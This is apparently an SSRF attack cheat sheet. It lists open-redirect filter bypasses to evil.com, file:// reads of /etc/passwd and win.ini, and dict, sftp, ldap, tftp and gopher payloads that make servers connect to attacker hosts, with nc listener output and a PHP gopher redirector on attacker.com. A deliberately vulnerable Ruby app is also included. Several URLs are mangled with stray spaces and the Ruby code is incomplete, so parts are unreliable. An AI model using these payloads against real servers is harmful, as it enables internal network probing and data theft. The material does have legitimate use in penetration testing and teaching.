## What can we do with SSRF 
1. SSRF to reflection XSS    
2. Try to use URL to access internal resources and make the server perform operations (file: ///, dict: //, ftp: //, gopher: // ..)    
3. Scan internal networks and ports    
4. If it is running on a cloud instance, you can try to get metadata    

### Change the writing of IP address
Some developers will filter out the intranet IP by regular matching the passed URL parameters. For example, the following regular expressions are used:    

The bypassing technique here is similar to the URL redirection bypass or SSRF bypassing technique.
```
^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$
^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
```

1. Single slash "/" bypass   

`https://www.xxx.com/redirect.php?url=/www.evil.com`

2. Missing protocol bypass

`https://www.xxx.com/redirect.php?url=//www.evil.com`

3. Multi-slash "/" prefix bypass

`https://www.xxx.com/redirect.php?url=///www.evil.com`

`https://www.xxx.com/redirect.php?url=////www.evil.com`

4. Bypass with "@"

`https://www.xxx.com/redirect.php?url=https://www.xxx.com@www.evil.com`

5. Use backslash "\" to bypass

`https://www.xxx.com/redirect.php?url=https://www.evil.com\https://www.xxx.com/`

6. Bypass with "#"

`https://www.xxx.com/redirect.php?url=https://www.evil.com#https://www.xxx.com/`

7. Bypass with "?"

`https://www.xxx.com/redirect.php?url=https://www.evil.com?www.xxx.com`

8. Bypass with "\\"

`https://www.xxx.com/redirect.php?url=https://www.evil.com\\www.xxx.com`

9. Use "." to bypass

`https://www.xxx.com/redirect.php?url=.evil`         
`https://www.xxx.com/redirect.php?url=.evil.com`

10. Repeating special characters to bypass

`https://www.xxx.com/redirect.php?url=///www.evil.com// ..`
`https://www.xxx.com/redirect.php?url=////www.evil.com// ..`


#### As talked about in "Understanding SSRF" there are 2 types of SSRF 
A. Show response to attacker (basic)     
B. Do now show response (blind)   

#### Basic 
As mentioned above, it shows the response to the attacker, so after the server gets the URL requested by the attacker, it will send the response back to the attacker.
DEMO (using Ruby).
Install the following packages and run the code
`gem install sinatra`
```ruby

require 'sinatra'
require 'open-uri'
 
get '/' do
  format 'RESPONSE: %s', open(params[:url]).read
```
The above code will open the local server port 4567 (taken from Jobert's POST hes in the references somewhere)    
`http: // localhost: 4567 /? url = contacts will open the contacts file and display the response in the front end`   
`http: // localhost: 4567 /? url = / etc / passwd will open etc / passwd and respond to the service`   
`http: // localhost: 4567 /? url = https: //google.com will request google.com on the server and display the response`      

Just get the file from an external site with a malicious payload with a content type of html. 
Example:   
`Example: http: // localhost: 4567 /? Url = http: //brutelogic.com.br/poc.svg`    

#### Test URL patterns 
When we found ssrf, the first thing to do was test all the wrappers that worked.    
```
file:///
dict://
sftp://
ldap://
tftp://
gopher://
```

#### file: //-
File is used to get files from the file system    
`http://example.com/ssrf.php?url=file:///C:/Windows/win.ini`   
`http://example.com/ssrf.php?url=file:///etc/passwd`   
If the server blocks http requests to external sites or whitelists, you can simply use the following URL pattern to make the request:    

#### dict: //-
DICT URL scheme is used to represent a list of definitions or words available using the DICT protocol:
```

http://example.com/ssrf.php?dict://evil.com:1337/
 
evil.com:$ nc -lvp 1337
Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 31126)
CLIENT libcurl 7.40.0
```

#### sftp: //-
Sftp stands for SSH File Transfer Protocol, or Secure File Transfer Protocol. It is an embedded protocol of SSH and is similar to SSH in secure connections.    
```

http://example.com/ssrf.php?url=sftp://evil.com:1337/
 
evil.com:$ nc -lvp 1337
Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 37146)
SSH-2.0-libssh2_1.4.2
```

#### ldap: // or ldaps: // or ldapi: //-
LDAP stands for Lightweight Directory Access Protocol. It is an application protocol for managing and accessing distributed directory information services through an IP network.
`http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit`   
`http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit`   
`http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit`   

#### tftp: //- 
Simple File Transfer Protocol is a simple lockstep file transfer protocol that allows clients to retrieve files from a remote host or place files on a remote host.    
```
http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
 
evil.com:# nc -lvup 1337
Listening on [0.0.0.0] (family 0, port 1337)
TESTUDPPACKEToctettsize0blksize512timeout3
```

#### gopher: //-
Gopher is a distributed document delivery service. It allows users to explore, search and retrieve information residing in different locations in a seamless way.     
```
http://example.com/ssrf.php?url=http://attacker.com/gopher.php
gopher.php (host it on acttacker.com):-
<?php
   header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
?>
 
evil.com:# nc -lvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 49398)
Hi
ssrf
test
```